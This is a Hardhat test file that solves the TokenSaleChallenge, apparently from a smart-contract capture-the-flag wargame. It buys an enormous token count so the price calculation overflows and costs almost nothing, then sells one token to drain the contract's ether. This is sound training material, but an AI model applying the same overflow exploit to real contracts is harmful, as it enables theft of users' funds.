import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.buy(
      "115792089237316195423570985008687907853269984665640564039458",
      {
        value: "415992086870360064",
      }
    )

    let balance = await target.balanceOf(await attacker.getAddress());
    console.log(`balance`, balance.toString());

    await target.sell(1);
    
    expect(await target.isComplete()).to.equal(true);
  });
});
